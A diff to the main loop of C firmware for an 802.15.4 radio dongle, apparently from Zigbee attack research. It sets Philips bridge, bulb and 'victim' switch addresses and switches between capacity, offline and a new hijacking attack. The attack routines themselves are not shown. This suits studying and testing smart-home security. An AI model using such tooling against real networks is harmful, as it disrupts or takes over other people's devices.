@@ -22,13 +22,6 @@ int main(void)
 
 	/* now we should be at 8 MHz */
 
-#ifdef DEBUG
-	uart_init();
-	static FILE atben_stdout = FDEV_SETUP_STREAM(uart_write_char, NULL,
-						     _FDEV_SETUP_WRITE);
-	stdout = &atben_stdout;
-#endif
-
 	usb_init();
 	ep0_init();
 #ifdef ATUSB
@@ -43,34 +36,56 @@ int main(void)
 	_delay_ms(3000);
 
 	// TODO: Here we need to implement Reconnaissance Attack first to determine device types and device address in the netwrok.
-	reconnaissance_attack();
+	// reconnaissance_attack();
 
 	/** TEST FIELD **/
-	uint8_t attack_no = 2;
+	uint8_t attack_no = 3;
 	// Here we let dst_device = hub, src_device = sensor to test our API
 	ieee802154_addr hub_addr = {};
-	hub_addr.pan = 0x2ca2;
-	hub_addr.epan = 0x0ab4da5c2ea6d3ec;
-	hub_addr.short_addr = 0x0000;
-	hub_addr.long_addr = 0x286d970002054a14;
+	hub_addr.pan = 0x7051;
+	// hub_addr.epan = ST_EPAN_ID; // Used for ST
+	hub_addr.epan = PHILIPS_EPAN_ID; // Used for Philips
+	hub_addr.short_addr = 0x0001;
+	hub_addr.long_addr = PHILIPS_BRIDGE_MAC_ADDR;
+	hub_addr.device_type = 0;
+	hub_addr.polling_type = 0;
 
-	ieee802154_addr zed_addr = hub_addr;
-	zed_addr.short_addr = 0x2d38;
-	zed_addr.long_addr = ST_SENSOR_MAC_ADDR;
-	zed_addr.polling_type = 2;
+	ieee802154_addr bulb_addr = hub_addr;
+	bulb_addr.short_addr = 0x0005;
+	bulb_addr.long_addr = PHILIPS_BULB_MAC_ADDR;
+	bulb_addr.device_type = 1;
+	bulb_addr.polling_type = 0;
+
+	ieee802154_addr victim_addr = hub_addr;
+	victim_addr.short_addr = 0xbf0f;
+	victim_addr.long_addr = PHILIPS_SWITCH_MAC_ADDR;
+	victim_addr.polling_type = 2;
+	victim_addr.device_type = 2;
+	victim_addr.rx_when_idle = 0;
 	/** END OF TEST FIELD **/
 
 	while (1)
 	{
-		if (attack_no == 1)
+		if( attack_no == 0xff)
 		{
-			capacity_attack(&hub_addr, 0x30000000);
+			sleep_mode();
+		}
+		else if (attack_no == 1)
+		{
+			// Fill up ZED list
+			capacity_attack(&bulb_addr, 0x10000000, 2);
+			attack_no = 0xff;
 		}
 		else if (attack_no == 2)
 		{
-			led(1);
-			offline_attack(&hub_addr, &zed_addr, 0x30000000);
-			led(0);
+			offline_attack(&hub_addr, &victim_addr, 0x20000000);
+			attack_no = 0xff;
+		}
+		else if (attack_no == 3)
+		{
+			bulb_addr.beacon_update_id = 0x08;
+			hijacking_attack(&bulb_addr, &victim_addr, 0x30000000);
+			attack_no = 0xff;
 		}
 		else
 		{
